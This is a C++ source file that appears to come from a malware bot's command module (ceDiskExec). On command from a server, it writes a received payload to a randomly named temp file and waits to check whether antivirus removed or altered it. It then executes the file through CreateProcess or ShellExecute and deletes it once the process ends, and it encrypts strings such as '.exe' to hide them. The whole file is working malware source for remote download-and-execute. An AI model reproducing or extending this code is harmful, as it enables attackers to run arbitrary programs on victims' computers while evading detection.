/*
	ceDiskExec.cpp
*/

#include <Windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"					
#include "..\inc\CryptoStrings.h"		
#include "..\inc\MyStreams.h"
#include "..\inc\MyStringRoutines.h"
#include "..\inc\DataCallbackManager.h"
#include "..\shared\CommStructures.h"

#include "ceGeneric.h"

#include "ceDiskExec.h"

/*
	Generates tmp filename with full path.
	wszSpecificExt - if NULL, use ".exe" extension. If some ptr passed, it will be appended as is. Dot is assumed to exist in extension
*/
BOOL deGenTmp(LPSTR szSpecificExt, LPWSTR *pwszResultingFile)
{
	BOOL bRes = FALSE;	// func result
	LPWSTR wszS;	// decrypt buffer, if needed

	LPWSTR wszRndName; // buffer to hold random filename part

	LPWSTR wszExt;	// mb to wchar convert buffer

	// alloc resulting buffer
	*pwszResultingFile = (LPWSTR)my_alloc(1024);

	if (!GetTempPath(510, *pwszResultingFile)) { DbgPrint("ERR: GetTempPath() failed, le %p", GetLastError()); return bRes; }
	
	DbgPrint("tmp path=[%ws]", *pwszResultingFile);

	wszRndName = (LPWSTR)my_alloc(1024);
	sr_genRandomChars(6, 12, wszRndName);
	lstrcat(*pwszResultingFile, wszRndName);
	my_free(wszRndName);

	// append extension according to params
	if (!szSpecificExt) {
		wszS = CRSTRW(".exe", "\xfe\xbf\x7b\x09\xfa\xbf\x35\x04\xf6\xa2\x06");
		lstrcat(*pwszResultingFile, wszS);
		my_free(wszS);
	} else { 
	
		// alloc wsz buffer
		wszExt = (LPWSTR)my_alloc(1024);

		// convert mb to wchar
		MultiByteToWideChar(CP_ACP, 0, szSpecificExt, -1, wszExt, 510);

		lstrcat(*pwszResultingFile, wszExt);

		my_free(wszExt);
	}

	bRes = TRUE;

	return bRes;
}


/*
	Attempts to place a file on disk
	pContents & dwContentsLen - decoded contents to be placed
	bIsExtensionInContents - if specified, target file extension is placed at pContents start, delimited with '|'
	dwResultingError - buffer to store resulting module-specific error, preserving last error state
	wszResultingFile - internally allocated buffer with resulting filename with path, ready for usage in CreateProcess()/ShellExecute() calls
*/
BOOL dePlaceFile(LPVOID pContents, DWORD dwContentsLen, BOOL bIsExtensionInContents, DWORD *pdwResultingError, DWORD *dwLastError, LPWSTR *pwszResultingFile)
{
	BOOL bRes = FALSE;	// default result

	// internal cast to input vars or newly allocated buffer with modified input
	LPVOID pBin = pContents;
	DWORD lBinLen = dwContentsLen;

	LPSTR szSpecificExt = NULL;	// allocated if specific extension extracted from bin

	HANDLE hFile = INVALID_HANDLE_VALUE;	// file to be written
	DWORD dwBytes;

	// buffer to hold file contents after it has been written to disk and read back again
	LPVOID pCheck = NULL;
	//DWORD lCheckLen;
	LARGE_INTEGER liSize = { 0 };

	// basic checks
	if (!pContents || !dwContentsLen || !pdwResultingError || !pwszResultingFile) { DbgPrint("ERR: invalid input params"); return bRes; }

	do { // not a loop

		// wipe le 
		*dwLastError = 0;

		// specific extension check, modifies pBin
		if (bIsExtensionInContents) {

			// search for delimiter in pContents in first 64 bytes
			BYTE lCounter = 0;
			BYTE *pb = (BYTE *)pContents;
			while (lCounter < 64) {
				if (*pb == '|') { break; }
				pb++; lCounter++;
			} // while < 64 chars scanned

			// check if found
			if ((*pb != '|') || (!lCounter)) { *pdwResultingError = ERR_DE_NO_EXTENSION_FOUND; DbgPrint("ERR: delimiter not found"); break; }

			DbgPrint("delimiter found at pos %u", lCounter);

			// alloc and copy ext
			szSpecificExt = (LPSTR)my_alloc(1024);
			memcpy(szSpecificExt, pContents, lCounter);
			DbgPrint("ext extracted: [%s]", szSpecificExt);

			// alloc new buffer to hold binary without delimited extension
			lCounter++;	// include terminator itself
			lBinLen = dwContentsLen - (lCounter);
			pBin = my_alloc(lBinLen);
			memcpy(pBin, (LPVOID)((SIZE_T)pContents + lCounter), lBinLen);
			DbgPrint("prepared clear file of %u bytes", lBinLen);

		} // bIsExtensionInContents

		// generate filename in available tmp dir
		if (!deGenTmp(szSpecificExt, pwszResultingFile)) { DbgPrint("ERR: failed to generate tmp fname"); *pdwResultingError = ERR_DE_TMPFILE_NAME_GENERATE_FAIL; break; }

		DbgPrint("target fname=[%ws]", *pwszResultingFile);

		// place file contents
		hFile = CreateFile(*pwszResultingFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) { *dwLastError = GetLastError(); *pdwResultingError = ERR_DE_CREATEFILE_FAILED; break; }

		if (!WriteFile(hFile, pBin, lBinLen, &dwBytes, NULL)) { *dwLastError = GetLastError(); *pdwResultingError = ERR_DE_WRITEFILE_FAILED; break; }

		FlushFileBuffers(hFile);
		CloseHandle(hFile);

		DbgPrint("ok written %u bytes, waiting before check", dwBytes);

		Sleep(4000);

		// now read it's contents
		hFile = CreateFile(*pwszResultingFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) { *dwLastError = GetLastError(); *pdwResultingError = ERR_DE_FILE_REMOVED_AFTER_CREATION; break; }

		if (!GetFileSizeEx(hFile, &liSize)) { *dwLastError = GetLastError(); *pdwResultingError = ERR_DE_GETSIZE_FAILED; break; }
		if (liSize.QuadPart != lBinLen)  { *pdwResultingError = ERR_DE_SIZE_MISMATCH; break; }

		pCheck = my_alloc(lBinLen);
		if (!ReadFile(hFile, pCheck, lBinLen, &dwBytes, NULL)) { *dwLastError = GetLastError(); *pdwResultingError = ERR_DE_FILE_READ_FAILED; break; }

		//CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;	// done outside of while {}

		// compare mem buffers
		if (!memcmp(pCheck, pBin, lBinLen)) {

			DbgPrint("check ok");
			bRes = TRUE;

		} else { *pdwResultingError = ERR_DE_FILE_MODIFIED_AFTER_WRITE; break; }

	} while (FALSE); // not a loop

	// close handles, if needed
	if (hFile != INVALID_HANDLE_VALUE) { CloseHandle(hFile); }

	// check for internally allocated buffers
	if (pCheck) { my_free(pCheck); }
	if (pBin != pContents) { my_free(pBin); }
	if (szSpecificExt) { my_free(szSpecificExt); }

	return bRes;
}


/*
	Waits for process to terminate and removed file, deallocates structure
*/
DWORD WINAPI thrdeRemoveCleanup(LPVOID lpParameter)
{
	CREATEPROCESS_PARAMS *cpParams = (CREATEPROCESS_PARAMS *)lpParameter;

	if (cpParams->pi.hProcess) {
		DbgPrint("waiting for process handle %p to terminate", cpParams->pi.hProcess);
		WaitForSingleObject(cpParams->pi.hProcess, INFINITE);
	} else { DbgPrint("NOTE: no process handle specified"); }

	// check if file still exists (may me self-removed or something else)
	if (GetFileAttributes(cpParams->wszApplication) != INVALID_FILE_ATTRIBUTES) {

		DbgPrint("removing [%ws]", cpParams->wszApplication);
		while (!DeleteFile(cpParams->wszApplication)) { Sleep(1000); DbgPrint("turn.."); }
		DbgPrint("removed ok");

	} else { DbgPrint("NOTE: file [%ws] is already removed", cpParams->wszApplication); }

	// free mem
	my_free(cpParams->wszApplication);
	my_free(cpParams);

	DbgPrint("finished, exiting");

	ExitThread(0);
}



// arch-specific + WOW3264 for EEM_CREATEPROCESS
// arch-independent for EEM_SHELLEXECUTE but with check for errors (msi of invalid arch for ex)
BOOL cmdDiskExec(DISPATCHER_CALLBACK_PARAMS *dcp, ENUM_EXECUTE_METHOD ExecMethod)
{
	SERVER_COMMAND *sCommand = (SERVER_COMMAND *)dcp->pInBuffer;	// command + payload ptr
	LPWSTR wszFilePlaced;	// buffer with a filename placed
	DWORD dwError = 0;	// error buffer from related apis
	DWORD dwLastError = 0;	// GetLastError() from dePlaceFile()

	BOOL bIsExtensionPrepended = FALSE;

	CREATEPROCESS_PARAMS *cpParams;	// for a _cmdSafeExec() call
	EXEC_ERROR_CODE seError = ERR_EXEC_OK;	// error code returned from _cmdSafeExec()

	DWORD dwThreadId; // CreateThread()'s

	DbgPrint("entered, ExecMethod=%u", ExecMethod);

	do {	// not a loop

		// arch check for EEM_CREATEPROCESS
		if ((ExecMethod == EEM_CREATEPROCESS) && (sCommand->bTargetArch != SCTA_ALL)) {

			if (sCommand->bTargetArch != SCTA_BUILD_ARCH) { cmFormAnswer(dcp, CER_ERR_PLATFORM_MISMATCH, NULL, 0); DbgPrint("ERR: platform mismatch: current=%u cmd_target=%u", SCTA_BUILD_ARCH, sCommand->bTargetArch); break; }

		} // ExecMethod

		// basic check
		if (!sCommand->dwPayloadSize) { cmFormAnswerSpecificErr(dcp, ERR_DE_EMPTY_FILE, 0); DbgPrint("ERR: empty file passed"); break; }

		// check for extension prepended (for EEM_SHELLEXECUTE)
		if (ExecMethod == EEM_SHELLEXECUTE) { bIsExtensionPrepended = TRUE; DbgPrint("extension to be searched in contents"); }

		// place file on disk
		if (!dePlaceFile((LPVOID)((SIZE_T)sCommand + sizeof(SERVER_COMMAND)), sCommand->dwPayloadSize, bIsExtensionPrepended, &dwError, &dwLastError, &wszFilePlaced)) { cmFormAnswerSpecificErr(dcp, dwError, dwLastError); DbgPrint("ERR: failed to place file: err=%u le=%u", dwError, dwLastError); break; }

		// file placed ok, attempt to execute it
		cpParams = (CREATEPROCESS_PARAMS *)my_alloc(sizeof(CREATEPROCESS_PARAMS));
		cpParams->wszApplication = wszFilePlaced;
		cpParams->emExecMethod = ExecMethod;

		if (!_cmdSafeExec(cpParams, &seError)) { cmFormAnswerSpecificErr(dcp, seError, cpParams->dwLastError); DbgPrint("ERR: _cmdSafeExec() failed, code %u, le %p", (DWORD)seError, cpParams->dwLastError); CloseHandle(CreateThread(NULL, 0, thrdeRemoveCleanup, cpParams, 0, &dwThreadId)); break; }

		DbgPrint("exec of [%ws] OK, creating cleanup thread", wszFilePlaced);

		// in any case, create a thread attempting to remove the file
		// thread should also deallocate passed wszFilePlaced
		CloseHandle(CreateThread(NULL, 0, thrdeRemoveCleanup, cpParams, 0, &dwThreadId));

		// report all done ok, if got here
		cmFormAnswer(dcp, CER_OK, NULL, 0);

	} while (FALSE);	// not a loop

	// should always return TRUE in order to stop sending this cmd to other callbacks
	return TRUE;
}